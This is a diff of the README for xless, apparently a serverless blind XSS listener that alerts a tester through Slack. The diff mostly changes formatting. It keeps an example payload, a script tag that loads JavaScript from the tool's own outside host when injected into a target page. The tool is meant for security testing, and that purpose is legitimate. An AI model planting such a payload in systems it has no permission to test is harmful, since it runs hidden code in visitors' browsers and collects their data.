@@ -1,23 +1,27 @@
-XLESS
-======
+<h1 align="center">
+  <br>
+  <a href="https://github.com/mazen160/xless"><img src="https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png" alt="Xless"></a>
+  <br>
+  xless
+  <br>
+</h1>
 
-# The Serverless Blind XSS App
+<h4 align="center">The Serverless Blind XSS App</h4>
 
-## About The Project
-xless is a serverless blind XSS app that can be used to identify blind XSS vulnerabilities using your own deployed version of the app. There is no need to run a full deployment process; just setup a zeit.co account and run `bash deploy.sh`. That's it. You have a fully-running Blind XSS listener that uses Slack to notify you for blind XSS callbacks.
+## :information_source: About The Project
+Xless is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.  
+There is no need to run a full deployment process; just setup a zeit.co account and run `bash deploy.sh`.
+That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.
 
-
-## Requirements
-
+## :warning: Requirements
 * zeit.co account: Zeit provides free plan for serverless. If you use another provider for serverless, code changes should be minimal.
 * Slack Incoming Webhook URL.
 
 
-## Deployment
+## :rocket: Deployment
+1. Run `bash deploy.sh`
 
-1. Run:
-
-```bash
+```shell
 $ bash deploy.sh
 
 > Deploying ~/xless under X
@@ -31,7 +35,7 @@ $ bash deploy.sh
 
 ## Example Payload
 
-```javascript
+```html
 <script src="https://xless.now.sh"></script>
 ```
 
@@ -85,8 +89,7 @@ Contribution is very welcome. Please share your ideas by Github issues and pull 
 
 Here are some ideas to start with:
 1. Enabling sharing of page screenshot - Check `test.payload.js`.
-2. A nice logo design!
-3. _Your idea of a new feature_?
+2. _Your idea of a new feature_?
 
 
 ## Acknowledgement
